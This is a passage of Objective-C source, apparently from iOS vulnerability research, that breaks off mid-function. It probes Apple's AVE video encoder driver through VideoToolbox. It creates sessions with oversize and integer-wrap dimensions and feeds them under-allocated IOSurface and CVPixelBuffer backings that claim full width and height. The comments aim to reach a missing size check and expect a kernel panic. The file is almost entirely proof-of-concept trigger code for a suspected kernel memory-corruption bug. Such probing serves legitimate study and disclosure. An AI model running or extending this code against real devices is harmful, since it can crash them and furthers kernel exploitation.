#import "AVEVTSmoke.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <Metal/Metal.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <string.h>
#import <stdlib.h>
#import <stdarg.h>
#import <stdio.h>
#import <fcntl.h>
#import <unistd.h>

// 26.6 AVE_Client_CheckInfo cap: width*height <= 65520*8192 == 0x1ffe0000
static const int64_t kP001ProductCap = (int64_t)65520 * (int64_t)8192;
// Refuse full-frame CVPixelBufferCreate above this product (~24MB NV12).
static const int64_t kP001FullAllocProductMax = (int64_t)8192 * (int64_t)8192; // ~100MB NV12, feasible

// IOSurface via dlopen — same pattern as P009 (no IOSurface/IOSurface.h on this SDK).
typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(IOSurfaceRef);

static void *p001IOSurfaceHandle(void) {
    static void *h;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    });
    return h;
}

static void vt647Log(int fd, NSMutableString *out, NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [out appendString:line]; [out appendString:@"\n"];
    if (fd >= 0) {
        const char *s = [line UTF8String];
        write(fd, s, strlen(s)); write(fd, "\n", 1);
        fcntl(fd, F_FULLFSYNC);
    }
}

@implementation AVEVTSmoke

static void flushCB(void *outputCallbackRefCon,
                    void *sourceFrameRefCon,
                    OSStatus status,
                    VTEncodeInfoFlags infoFlags,
                    CMSampleBufferRef sampleBuffer) {
    NSMutableString *log = (__bridge NSMutableString *)outputCallbackRefCon;
    if (status != noErr) {
        [log appendFormat:@"encode callback status=%d (0x%x)\n", (int)status, (unsigned)status];
        return;
    }
    if (!sampleBuffer) {
        [log appendString:@"encode callback: null sample\n"];
        return;
    }
    [log appendFormat:@"encode callback: OK sample size=%zu\n",
     CMSampleBufferGetTotalSampleSize(sampleBuffer)];
}

#pragma mark - Smoke / dim probe (unchanged behavior)

+ (NSString *)performSmoke {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"VT smoke: 1280x720 H.264, 1 frame (no wrap dims)\n"];

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_H264,
        NULL, NULL, NULL, flushCB, (__bridge void *)out, &session);
    if (st != noErr || !session) {
        [out appendFormat:@"VTCompressionSessionCreate failed: %d (0x%x)\n", (int)st, (unsigned)st];
        return out;
    }
    [out appendString:@"VTCompressionSessionCreate: OK\n"];

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    VTCompressionSessionPrepareToEncodeFrames(session);

    CVPixelBufferRef pb = NULL;
    st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             NULL, &pb);
    if (st != noErr || !pb) {
        [out appendFormat:@"CVPixelBufferCreate failed: %d\n", (int)st];
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return out;
    }

    st = VTCompressionSessionEncodeFrame(
        session, pb, CMTimeMake(0, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
    [out appendFormat:@"EncodeFrame: %d (0x%x)\n", (int)st, (unsigned)st];

    st = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    [out appendFormat:@"CompleteFrames: %d (0x%x)\n", (int)st, (unsigned)st];

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    [out appendString:@"DONE — paste this text back\n"];
    return out;
}

+ (void)runDimCase:(NSMutableString *)out
             label:(NSString *)label
             width:(int32_t)w
            height:(int32_t)h
     tryEncodeTiny:(BOOL)tryEncode {
    int64_t product = (int64_t)w * (int64_t)h;
    [out appendFormat:@"\n--- %@ ---\n", label];
    [out appendFormat:@"session dims: %d x %d  product=%lld  cap=%lld  over=%s\n",
     (int)w, (int)h, product, kP001ProductCap, (product > kP001ProductCap) ? "YES" : "no"];

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, w, h, kCMVideoCodecType_H264,
        NULL, NULL, NULL, flushCB, (__bridge void *)out, &session);
    if (st != noErr || !session) {
        [out appendFormat:@"VTCompressionSessionCreate: FAIL %d (0x%x)\n", (int)st, (unsigned)st];
        [out appendString:@"(userspace/VT reject — may not have reached AVE CheckInfo)\n"];
        return;
    }
    [out appendString:@"VTCompressionSessionCreate: OK (session accepted dims)\n"];

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    st = VTCompressionSessionPrepareToEncodeFrames(session);
    [out appendFormat:@"PrepareToEncodeFrames: %d (0x%x)\n", (int)st, (unsigned)st];

    if (!tryEncode) {
        [out appendString:@"encode: skipped (create-only case)\n"];
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferRef pb = NULL;
    st = CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             NULL, &pb);
    if (st != noErr || !pb) {
        [out appendFormat:@"tiny CVPixelBufferCreate failed: %d — stop before encode\n", (int)st];
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    st = VTCompressionSessionEncodeFrame(
        session, pb, CMTimeMake(0, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
    [out appendFormat:@"EncodeFrame(tiny 64x64 into oversize session): %d (0x%x)\n",
     (int)st, (unsigned)st];

    st = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    [out appendFormat:@"CompleteFrames: %d (0x%x)\n", (int)st, (unsigned)st];

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

+ (NSString *)performP001DimProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P001 dim probe (VT only — no IOKit selectors)\n"];
    [out appendString:@"Theory: 23F77 missing CheckInfo width*height <= 65520*8192\n"];
    [out appendString:@"Expect: VT may reject in userspace; if Create OK, note for AVE reach\n"];
    [out appendString:@"Not KRW — reachability / differential signal only\n"];

    [self runDimCase:out label:@"A at-cap 65520x8192" width:65520 height:8192 tryEncodeTiny:NO];
    [self runDimCase:out label:@"B over-cap 65521x8192" width:65521 height:8192 tryEncodeTiny:NO];
    [self runDimCase:out label:@"C over-cap 20000x30000 + tiny encode" width:20000 height:30000 tryEncodeTiny:YES];
    [self runDimCase:out label:@"D wrap-shaped 65536x65536 create-only" width:65536 height:65536 tryEncodeTiny:NO];

    [out appendString:@"\nDONE — paste this text back\n"];
    [out appendString:@"Interpret: Create FAIL=likely VT clamp; Create OK=dims reached deeper\n"];
    return out;
}

#pragma mark - Process probe (matching metadata / under-alloc)

static void p001ReleasePixelBytes(void *releaseRefCon, const void *baseAddress) {
    (void)baseAddress;
    free(releaseRefCon);
}

/// Matching W×H metadata with small backing.
/// Lab v1: AllocSize=64KiB with bpr=256 failed IOSurfaceCreate even at 1280×720
/// (inconsistent vs bpr×height). Retry: (1) IOSurface alloc=bpr×h, narrow bpr;
/// (2) CVPixelBufferCreateWithBytes same lie.
+ (CVPixelBufferRef)underAllocPixelBufferWidth:(int32_t)w
                                        height:(int32_t)h
                                           log:(NSMutableString *)out {
    // Narrow stride: claim full W×H, back only bpr×h bytes.
    size_t bpr = 256;
    size_t alloc = bpr * (size_t)h;
    // Cap backing at 8 MiB — wrap height 65536 × 256 = 16 MiB; use smaller bpr if needed.
    if (alloc > 8 * 1024 * 1024) {
        bpr = 64;
        alloc = bpr * (size_t)h;
    }
    if (alloc > 8 * 1024 * 1024) {
        [out appendFormat:@"REFUSE under-alloc backing %zu for %dx%d\n", alloc, (int)w, (int)h];
        return NULL;
    }

    void *iosH = p001IOSurfaceHandle();
    IOSurfaceCreate_t iosCreate = iosH ? (IOSurfaceCreate_t)dlsym(iosH, "IOSurfaceCreate") : NULL;
    IOSurfaceGetID_t iosGetID = iosH ? (IOSurfaceGetID_t)dlsym(iosH, "IOSurfaceGetID") : NULL;

    if (iosCreate) {
        NSDictionary *props = @{
            @"IOSurfaceWidth": @(w),
            @"IOSurfaceHeight": @(h),
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfaceBytesPerRow": @(bpr),
            @"IOSurfaceAllocSize": @(alloc),
            @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
        };
        IOSurfaceRef surf = iosCreate((__bridge CFDictionaryRef)props);
        if (surf) {
            [out appendFormat:@"IOSurface narrow-stride OK: claim %dx%d bpr=%zu alloc=%zu id=%u\n",
             (int)w, (int)h, bpr, alloc, iosGetID ? iosGetID(surf) : 0];
            CVPixelBufferRef pb = NULL;
            CVReturn cv = CVPixelBufferCreateWithIOSurface(kCFAllocatorDefault, surf, NULL, &pb);
            CFRelease(surf);
            if (cv == kCVReturnSuccess && pb) {
                [out appendFormat:@"CVPixelBuffer from IOSurface: %dx%d\n",
                 (int)CVPixelBufferGetWidth(pb), (int)CVPixelBufferGetHeight(pb)];
                return pb;
            }
            [out appendFormat:@"CVPixelBufferCreateWithIOSurface FAIL cv=%d — try CreateWithBytes\n",
             (int)cv];
        } else {
            [out appendFormat:@"IOSurfaceCreate narrow-stride %dx%d FAIL (bpr=%zu alloc=%zu)\n",
             (int)w, (int)h, bpr, alloc];
        }
    } else {
        [out appendString:@"IOSurface dlsym miss — try CreateWithBytes\n"];
    }

    void *base = calloc(1, alloc);
    if (!base) {
        [out appendFormat:@"calloc(%zu) FAIL\n", alloc];
        return NULL;
    }
    CVPixelBufferRef pb = NULL;
    CVReturn cv = CVPixelBufferCreateWithBytes(
        kCFAllocatorDefault,
        (size_t)w,
        (size_t)h,
        kCVPixelFormatType_32BGRA,
        base,
        bpr,
        p001ReleasePixelBytes,
        base,
        NULL,
        &pb);
    if (cv != kCVReturnSuccess || !pb) {
        [out appendFormat:@"CVPixelBufferCreateWithBytes FAIL cv=%d (claim %dx%d bpr=%zu)\n",
         (int)cv, (int)w, (int)h, bpr];
        free(base);
        return NULL;
    }
    [out appendFormat:@"CVPixelBufferCreateWithBytes OK: claim %dx%d bpr=%zu backing=%zu\n",
     (int)w, (int)h, bpr, alloc];
    return pb;
}

+ (CVPixelBufferRef)fullPixelBufferWidth:(int32_t)w
                                  height:(int32_t)h
                                     log:(NSMutableString *)out {
    int64_t product = (int64_t)w * (int64_t)h;
    if (product > kP001FullAllocProductMax) {
        [out appendFormat:@"REFUSE full CVPixelBuffer %dx%d product=%lld (>%lld) — OOM risk\n",
         (int)w, (int)h, product, kP001FullAllocProductMax];
        return NULL;
    }
    CVPixelBufferRef pb = NULL;
    CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                      kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                      NULL, &pb);
    if (cv != kCVReturnSuccess || !pb) {
        [out appendFormat:@"CVPixelBufferCreate full FAIL cv=%d\n", (int)cv];
        return NULL;
    }
    [out appendFormat:@"CVPixelBuffer full NV12: %dx%d OK\n", (int)w, (int)h];
    return pb;
}

+ (void)runProcessCase:(NSMutableString *)out
                 label:(NSString *)label
                 width:(int32_t)w
                height:(int32_t)h
            bufferMode:(NSString *)mode {
    int64_t product = (int64_t)w * (int64_t)h;
    [out appendFormat:@"\n=== %@ ===\n", label];
    [out appendFormat:@"session %d x %d  product=%lld  over_cap=%s  mode=%@\n",
     (int)w, (int)h, product, (product > kP001ProductCap) ? "YES" : "no", mode];

    // Pass source attrs at Create (not a guessed session property).
    NSDictionary *srcAttrs = nil;
    if ([mode isEqualToString:@"underalloc"]) {
        srcAttrs = @{
            (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
            (id)kCVPixelBufferWidthKey: @(w),
            (id)kCVPixelBufferHeightKey: @(h),
        };
    }

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, w, h, kCMVideoCodecType_H264,
        NULL,
        (__bridge CFDictionaryRef)srcAttrs,
        NULL, flushCB, (__bridge void *)out, &session);
    if (st != noErr || !session) {
        [out appendFormat:@"Create: FAIL %d (0x%x) — stop case\n", (int)st, (unsigned)st];
        return;
    }
    [out appendString:@"Create: OK\n"];

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    [out appendFormat:@"Prepare: %d (0x%x)\n", (int)st, (unsigned)st];

    CVPixelBufferRef pb = NULL;
    if ([mode isEqualToString:@"full"]) {
        pb = [self fullPixelBufferWidth:w height:h log:out];
    } else if ([mode isEqualToString:@"underalloc"]) {
        pb = [self underAllocPixelBufferWidth:w height:h log:out];
    } else {
        [out appendFormat:@"STOP unknown mode %@\n", mode];
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }
    if (!pb) {
        [out appendString:@"no pixel buffer — skip encode\n"];
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    st = VTCompressionSessionEncodeFrame(
        session, pb, CMTimeMake(0, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
    [out appendFormat:@"EncodeFrame: %d (0x%x)\n", (int)st, (unsigned)st];

    st = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    [out appendFormat:@"CompleteFrames: %d (0x%x)\n", (int)st, (unsigned)st];

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

+ (NSString *)performP001ProcessProbe {
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"ave64747_process.txt"];
    int fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    vt647Log(fd, out, @"logfile: %@", lp);
    vt647Log(fd, out, @"=== 64747 matching-W×H encode (Process path) ===");
    vt647Log(fd, out, @"time %@", [NSDate date]);
    vt647Log(fd, out, @"Prior: Create/Prepare accept wrap dims; tiny-64x64 encode = kVTParameterErr (-12902).");
    vt647Log(fd, out, @"This probe encodes MATCHING W×H (under-alloc backing) so AVE Process can run.");
    vt647Log(fd, out, @"If device panics: DO NOT re-tap. This file names the last case.");

    vt647Log(fd, out, @"CHK C0 control full-match 1280x720");
    [self runProcessCase:out
                   label:@"C0 control full-match 1280x720"
                   width:1280
                  height:720
              bufferMode:@"full"];
    if (fd >= 0) { const char *s = [out UTF8String]; ftruncate(fd, 0); lseek(fd, 0, SEEK_SET); write(fd, s, strlen(s)); fcntl(fd, F_FULLFSYNC); }

    vt647Log(fd, out, @"CHK C1 control under-alloc match 1280x720");
    [self runProcessCase:out
                   label:@"C1 control under-alloc match 1280x720"
                   width:1280
                  height:720
              bufferMode:@"underalloc"];
    if (fd >= 0) { const char *s = [out UTF8String]; ftruncate(fd, 0); lseek(fd, 0, SEEK_SET); write(fd, s, strlen(s)); fcntl(fd, F_FULLFSYNC); }

    vt647Log(fd, out, @"CHK P0 over-cap under-alloc match 65521x8192");
    [self runProcessCase:out
                   label:@"P0 over-cap under-alloc match 65521x8192"
                   width:65521
                  height:8192
              bufferMode:@"underalloc"];
    if (fd >= 0) { const char *s = [out UTF8String]; ftruncate(fd, 0); lseek(fd, 0, SEEK_SET); write(fd, s, strlen(s)); fcntl(fd, F_FULLFSYNC); }

    vt647Log(fd, out, @"CHK P1 wrap under-alloc match 65536x65536");
    [self runProcessCase:out
                   label:@"P1 wrap under-alloc match 65536x65536"
                   width:65536
                  height:65536
              bufferMode:@"underalloc"];
    if (fd >= 0) { const char *s = [out UTF8String]; ftruncate(fd, 0); lseek(fd, 0, SEEK_SET); write(fd, s, strlen(s)); fcntl(fd, F_FULLFSYNC); }

    vt647Log(fd, out, @"DONE — paste this text back");
    vt647Log(fd, out, @"Read: C0 encode OK = Process reachable. C1 OK = under-stride accepted.");
    vt647Log(fd, out, @"P0/P1 panic = 64747. Callback -12902 = VT still rejecting. -19354 = soft encoder fail.");
    if (fd >= 0) close(fd);
    return out;
}

+ (NSString *)performP001CapBoundaryProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P001 cap-boundary encode (under-stride CreateWithBytes)\n"];
    [out appendString:@"Goal: is -19354 a CheckInfo-product reject or VT max-dim reject?\n"];
    [out appendString:@"Not KRW\n"];

    // Large but under product cap — VT capability control.
    [self runProcessCase:out
                   label:@"L0 large under-cap 8192x8192"
                   width:8192
                  height:8192
              bufferMode:@"underalloc"];

    // Exactly at 26.6 CheckInfo product cap.
    [self runProcessCase:out
                   label:@"B0 at-cap 65520x8192"
                   width:65520
                  height:8192
              bufferMode:@"underalloc"];

    // Just over cap (same shape as P0).
    [self runProcessCase:out
                   label:@"B1 just-over 65521x8192"
                   width:65521
                  height:8192
              bufferMode:@"underalloc"];

    // Square just over cap (product 536848900 > 536739840); both dims ~23k.
    [self runProcessCase:out
                   label:@"B2 square just-over 23170x23170"
                   width:23170
                  height:23170
              bufferMode:@"underalloc"];

    [out appendString:@"\nDONE — paste this text back\n"];
    [out appendString:@"Read:\n"];
    [out appendString:@"  L0 FAIL -> VT cannot encode large frames (capability); P0 -19354 weak for CheckInfo\n"];
    [out appendString:@"  L0 OK, B0 OK, B1 -19354 -> reject tracks product cap (strong Path B)\n"];
    [out appendString:@"  L0 OK, B0 -19354 -> even at-cap encode blocked (not product-edge alone)\n"];
    [out appendString:@"  Panic / new status -> deepen CreateDataSurfaces; else method-table/P008\n"];
    return out;
}

/* p013ave: A14 26.5 AVE dimension ladder. p011_log-style F_FULLFSYNC. */
static NSMutableString *p013_buf;
static int p013_fd = -1;

static void p013_log(const char *fmt, ...) {
    char lb[800];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb) - 1, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    if (n > (int)sizeof(lb) - 2) n = (int)sizeof(lb) - 2;
    lb[n++] = '\n';
    lb[n] = 0;
    @synchronized ([NSString class]) {
        if (p013_buf) [p013_buf appendFormat:@"%.*s", n, lb];
        if (p013_fd >= 0) {
            write(p013_fd, lb, (size_t)n);
            fcntl(p013_fd, F_FULLFSYNC);
        }
    }
}

typedef struct {
    OSStatus status;
    size_t size;
    int fired;
} P013CB;

static void p013_cb(void *outputCallbackRefCon,
                    void *sourceFrameRefCon,
                    OSStatus status,
                    VTEncodeInfoFlags infoFlags,
                    CMSampleBufferRef sampleBuffer) {
    (void)sourceFrameRefCon;
    (void)infoFlags;
    P013CB *c = (P013CB *)outputCallbackRefCon;
    if (!c) return;
    c->status = status;
    c->size = sampleBuffer ? CMSampleBufferGetTotalSampleSize(sampleBuffer) : 0;
    c->fired = 1;
}

static void p013_fill_nv12(CVPixelBufferRef pb) {
    if (!pb) return;
    if (CVPixelBufferLockBaseAddress(pb, 0) != kCVReturnSuccess) return;
    size_t n = CVPixelBufferGetPlaneCount(pb);
    if (n >= 1) {
        void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
        size_t ybpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
        size_t yh = CVPixelBufferGetHeightOfPlane(pb, 0);
        if (y && ybpr && yh) memset(y, 0x80, ybpr * yh);
    }
    if (n >= 2) {
        void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
        size_t ubpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 1);
        size_t uh = CVPixelBufferGetHeightOfPlane(pb, 1);
        if (uv && ubpr && uh) memset(uv, 0x80, ubpr * uh);
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);
}

/* 0 = ok-or-skip, 1 = this dim failed (create/prepare/encode/cb). pixbuf fail is data, not fail. */
static int p013_step(int32_t w, int32_t h, int *out_sync, int *out_cb, size_t *out_sz, int *out_kind) {
    int64_t product = (int64_t)w * (int64_t)h;
    *out_sync = 0;
    *out_cb = 0;
    *out_sz = 0;
    *out_kind = 0; /* 0 ok, 1 create, 2 prepare, 3 pixbuf, 4 encode, 5 callback */

    P013CB cb = {0, 0, 0};
    VTCompressionSessionRef session = NULL;
    p013_log("p013 [%dx%d] creating session product=%lld — if last line, died in Create",
             (int)w, (int)h, product);
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, w, h, kCMVideoCodecType_H264,
        NULL, NULL, NULL, p013_cb, &cb, &session);
    if (st != noErr || !session) {
        p013_log("p013 [%dx%d] product=%lld sync=0x%x cb=n/a size=0 Create=%d (0x%x)",
                 (int)w, (int)h, product, (unsigned)st, (int)st, (unsigned)st);
        *out_sync = (int)st;
        *out_kind = 1;
        return 1;
    }
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    p013_log("p013 [%dx%d] PrepareToEncodeFrames — if last line, died in Prepare", (int)w, (int)h);
    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        p013_log("p013 [%dx%d] product=%lld sync=0x%x cb=n/a size=0 Prepare=%d (0x%x)",
                 (int)w, (int)h, product, (unsigned)st, (int)st, (unsigned)st);
        *out_sync = (int)st;
        *out_kind = 2;
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return 1;
    }

    p013_log("p013 [%dx%d] CVPixelBufferCreate full NV12 — if last line, jetsam/OOM", (int)w, (int)h);
    CVPixelBufferRef pb = NULL;
    CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, (size_t)w, (size_t)h,
                                      kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                      NULL, &pb);
    if (cv != kCVReturnSuccess || !pb) {
        p013_log("p013 [%dx%d] product=%lld pixbuf cv=%d (0x%x) — data, skip encode",
                 (int)w, (int)h, product, (int)cv, (unsigned)cv);
        *out_kind = 3;
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return 0; /* pixbuf fail is data, not first-fail for repeats */
    }
    p013_fill_nv12(pb);

    p013_log("p013 [%dx%d] EncodeFrame — if last line, died in Encode", (int)w, (int)h);
    st = VTCompressionSessionEncodeFrame(
        session, pb, CMTimeMake(0, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
    *out_sync = (int)st;
    OSStatus comp = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    (void)comp;
    *out_cb = (int)cb.status;
    *out_sz = cb.size;
    p013_log("p013 [%dx%d] product=%lld sync=0x%x cb=0x%x size=%zu fired=%d Complete=%d",
             (int)w, (int)h, product, (unsigned)st, (unsigned)cb.status, cb.size, cb.fired, (int)comp);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    if (st != noErr) {
        *out_kind = 4;
        return 1;
    }
    if (cb.fired && cb.status != noErr) {
        *out_kind = 5;
        return 1;
    }
    return 0;
}

+ (NSString *)performA14AVEDimLadder {
    p013_buf = [NSMutableString string];
    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p013_ave_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p013_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p013_log("=== p013ave: A14 26.5 / 23F77 AVE dimension ladder ===");
    p013_log("[*] VT H.264. Fresh session per step. Full NV12. Pixbuf fail is data.");
    p013_log("[*] cap product 65520*8192=0x1ffe0000. Repeat first-fail 20x if session lives.");
    p013_log("[*] Not KRW.");
    fcntl(p013_fd, F_FULLFSYNC);

    struct { int32_t w, h; const char *tag; } steps[] = {
        {1920, 1080, "A"}, {3840, 2160, "A"}, {4096, 4096, "A"}, {8192, 8192, "A"},
        {8192, 65520, "B"}, {8192, 65519, "B"}, {8192, 65521, "B"}, {8192, 32760, "B"}, {8192, 16380, "B"},
        {16384, 1024, "C"}, {32768, 512, "C"}, {65536, 256, "C"},
        {8191, 8192, "D"}, {8192, 8191, "D"}, {8191, 8191, "D"}, {8193, 8192, "D"},
    };
    int nsteps = (int)(sizeof(steps) / sizeof(steps[0]));
    int first_w = 0, first_h = 0, first_kind = 0, first_sync = 0, first_cb = 0;
    int found_fail = 0;

    for (int i = 0; i < nsteps; i++) {
        int32_t w = steps[i].w, h = steps[i].h;
        int sync = 0, cbst = 0, kind = 0;
        size_t sz = 0;
        int failed = p013_step(w, h, &sync, &cbst, &sz, &kind);
        fcntl(p013_fd, F_FULLFSYNC);
        if (failed && !found_fail) {
            found_fail = 1;
            first_w = (int)w;
            first_h = (int)h;
            first_kind = kind;
            first_sync = sync;
            first_cb = cbst;
        }
    }

    if (found_fail && first_kind != 1) {
        /* Repeat first failing dim 20 times in ONE session, if Create succeeded. */
        p013_log("p013 repeat: first-fail %dx%d kind=%d — 20 encodes same session",
                 first_w, first_h, first_kind);
        fcntl(p013_fd, F_FULLFSYNC);
        P013CB cb = {0, 0, 0};
        VTCompressionSessionRef session = NULL;
        p013_log("p013 repeat Create %dx%d — if last line, died in repeat Create", first_w, first_h);
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, first_w, first_h, kCMVideoCodecType_H264,
            NULL, NULL, NULL, p013_cb, &cb, &session);
        if (st != noErr || !session) {
            p013_log("p013 repeat Create FAIL %d (0x%x) — no session to repeat", (int)st, (unsigned)st);
        } else {
            VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            VTCompressionSessionPrepareToEncodeFrames(session);
            CVPixelBufferRef pb = NULL;
            CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, (size_t)first_w, (size_t)first_h,
                                              kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                              NULL, &pb);
            if (cv != kCVReturnSuccess || !pb) {
                p013_log("p013 repeat pixbuf cv=%d — cannot encode-repeat", (int)cv);
            } else {
                p013_fill_nv12(pb);
                int drift = 0;
                OSStatus prev = 0x7fffffff;
                for (int r = 0; r < 20; r++) {
                    cb.status = 0;
                    cb.size = 0;
                    cb.fired = 0;
                    p013_log("p013 repeat [%d/20] EncodeFrame %dx%d — if last line, died on repeat %d",
                             r + 1, first_w, first_h, r + 1);
                    fcntl(p013_fd, F_FULLFSYNC);
                    st = VTCompressionSessionEncodeFrame(
                        session, pb, CMTimeMake(r, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
                    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
                    p013_log("p013 repeat [%d/20] product=%lld sync=0x%x cb=0x%x size=%zu fired=%d",
                             r + 1, (int64_t)first_w * (int64_t)first_h,
                             (unsigned)st, (unsigned)cb.status, cb.size, cb.fired);
                    fcntl(p013_fd, F_FULLFSYNC);
                    if (r == 0) prev = cb.status;
                    else if (cb.status != prev) drift = 1;
                }
                p013_log("p013 repeat drift=%d", drift);
                CVPixelBufferRelease(pb);
            }
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }
    } else if (found_fail && first_kind == 1) {
        p013_log("p013 repeat skipped — first fail was Create (no session)");
    } else {
        p013_log("p013 repeat skipped — no failing dim");
    }

    if (!found_fail)
        p013_log("p013 verdict: no-fail (all Create/Prepare/Encode/cb ok or pixbuf-skip)");
    else {
        const char *kn = "?";
        if (first_kind == 1) kn = "Create";
        else if (first_kind == 2) kn = "Prepare";
        else if (first_kind == 4) kn = "EncodeFrame";
        else if (first_kind == 5) kn = "callback";
        p013_log("p013 verdict: first-fail %dx%d %s sync=0x%x cb=0x%x (repeats in log if session lived)",
                 first_w, first_h, kn, (unsigned)first_sync, (unsigned)first_cb);
    }
    if (p013_fd >= 0) { fcntl(p013_fd, F_FULLFSYNC); close(p013_fd); p013_fd = -1; }
    return p013_buf ?: @"STOP: no log";
}

+ (NSString *)performA13AVEVTLadder {
    NSMutableString *out = [NSMutableString string];
    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p001_a13_vt_ladder_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    int fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);
    vt647Log(fd, out, @"=== A13 AVE VT ladder (A14-based) ===");
    vt647Log(fd, out, @"Same cases as A14: S1 3840x2160, S2 4096x4096, S3 8192x8192, then 65520*8192 sweep");
    vt647Log(fd, out, @"26.6 CheckInfo gate present: product <= 65520*8192 = 0x1ffe0000");
    vt647Log(fd, out, @"VT only. Not KRW. No wrap-formula Encode.");
    fcntl(fd, F_FULLFSYNC);

    [self runProcessCase:out label:@"S0 1920x1080" width:1920 height:1080 bufferMode:@"full"];
    fcntl(fd, F_FULLFSYNC);
    [self runProcessCase:out label:@"S1 3840x2160" width:3840 height:2160 bufferMode:@"full"];
    fcntl(fd, F_FULLFSYNC);
    [self runProcessCase:out label:@"S2 4096x4096" width:4096 height:4096 bufferMode:@"full"];
    fcntl(fd, F_FULLFSYNC);
    [self runProcessCase:out label:@"S3 8192x8192" width:8192 height:8192 bufferMode:@"full"];
    fcntl(fd, F_FULLFSYNC);

    vt647Log(fd, out, @"\n--- product-cap sweep (under-stride, no 805MB alloc) ---");
